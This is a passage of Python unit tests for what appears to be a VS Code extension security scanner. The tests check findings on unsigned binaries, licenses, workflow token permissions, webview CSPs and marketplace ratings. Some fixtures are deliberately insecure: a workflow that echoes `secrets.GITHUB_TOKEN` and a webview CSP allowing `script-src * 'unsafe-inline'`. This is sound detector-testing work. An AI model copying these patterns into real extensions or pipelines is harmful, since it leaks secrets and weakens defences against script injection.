        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertIn("binary-without-origin", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.verdict, "review")

    def test_binary_with_checksum_companion_does_not_flag_missing_origin(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"native-signed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native-binary-payload")
            (root / "server.node.sha256").write_text("deadbeef", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("repo-binary-artifacts", rule_ids)
        self.assertNotIn("binary-without-origin", rule_ids)

    def test_license_missing_is_posture_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"nolicense","version":"1.0.0"}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("license-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertNotEqual(report.verdict, "malicious")
        self.assertNotEqual(report.verdict, "suspicious")

    def test_license_present_suppresses_license_missing_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"licensed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "LICENSE").write_text("MIT", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("license-missing", rule_ids)

    def test_workflow_broad_token_permissions_is_posture_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"broad-token","version":"1.0.0","repository":"https://github.com/example/broad-token"}',
                encoding="utf-8",
            )
            (workflows / "release.yml").write_text(
                "on: push\njobs:\n  release:\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }}\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("workflow-token-permissions-broad", rule_ids)
        self.assertNotIn("dangerous-github-workflow", rule_ids)

    def test_webview_without_csp_meta_tag_is_review_capability(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-nocsp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.verdict, "review")

    def test_webview_with_unsafe_csp_directive_is_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-unsafe-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'self\\'; script-src * \\'unsafe-inline\\'\"></head>"
                "<body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-unsafe-directive", rule_ids)
        self.assertNotIn("webview-csp-missing", rule_ids)

    def test_webview_with_strict_csp_is_not_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-strict-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'none\\'; script-src {{cspSource}} \\'nonce-abc123\\'\"></head>"
                "<body><script nonce=\"abc123\">doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("webview-csp-missing", rule_ids)
        self.assertNotIn("webview-csp-unsafe-directive", rule_ids)

    def test_install_rating_mismatch_is_reputation_context_only(self) -> None:
        findings = _marketplace_metadata_findings("example.popular-bad-rating", {
            "extension_id": "example.popular-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 200000,
            "rating_count": 50,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("install-rating-mismatch", rule_ids)
        self.assertIn("marketplace-low-rating", rule_ids)
        mismatch = next(finding for finding in findings if finding["rule_id"] == "install-rating-mismatch")
        self.assertEqual(mismatch["category"], "reputation")

    def test_install_rating_mismatch_does_not_fire_for_low_install_low_rating(self) -> None:
        findings = _marketplace_metadata_findings("example.small-bad-rating", {
            "extension_id": "example.small-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 50,
            "rating_count": 5,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertNotIn("install-rating-mismatch", rule_ids)


if __name__ == "__main__":
    unittest.main()
